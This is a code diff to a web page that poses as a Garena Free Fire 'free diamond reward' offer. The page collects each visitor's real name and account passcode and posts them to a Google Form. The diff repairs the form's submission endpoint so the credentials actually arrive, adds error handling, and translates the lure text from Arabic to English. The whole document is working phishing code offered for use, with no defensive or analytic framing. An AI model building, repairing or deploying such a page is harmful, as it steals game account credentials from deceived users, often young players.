@@ -18,13 +18,17 @@
             formData.append("entry.883013378", passcode); // For "Passcode"
 
             // Submit the form using fetch to Google Form
-            fetch('https://docs.google.com/forms/d/e/1FAIpQLScrjWYYpwwiJHYE4AkAxDlgthQdXjnGiYYhobdxwBPjK8iFHg/viewform?usp=sf_link', {
+            fetch('https://docs.google.com/forms/d/e/1FAIpQLScrjWYYpwwiJHYE4AkAxDlgthQdXjnGiYYhobdxwBPjK8iFHg/formResponse', {
                 method: 'POST',
                 body: formData
             })
             .then(response => {
-                console.log('Form submitted successfully:', response);
-                alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
+                if (response.ok) {
+                    console.log('Form submitted successfully:', response);
+                    alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
+                } else {
+                    throw new Error('Error submitting form: ' + response.statusText);
+                }
             })
             .catch(error => {
                 console.error('Error submitting form:', error);
@@ -45,12 +49,12 @@
         <img src="Logo_of_Garena_Free_Fire.png" alt="Top Image" class="top-image"> <!-- Replace with your image path -->
     </header>
     <main>
-        <h1>مكافأة الماس المجانية من فري فاير</h1>
-        <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
+        <h1>Freefire Free Diamond Reward</h1>
+        <p>Please enter your Free Fire account information below to confirm your identity.</p>
         
-        <input type="text" id="realLifeName" placeholder="اسمك الحقيقي" required>
-        <input type="text" id="passcode" placeholder="رقم سري" required>
-        <button onclick="gatherInfo()">اقبل</button>
+        <input type="text" id="realLifeName" placeholder="Your Real Name" required>
+        <input type="text" id="passcode" placeholder="Passcode" required>
+        <button onclick="gatherInfo()">Accept</button>
     </main>
 </body>
 </html>
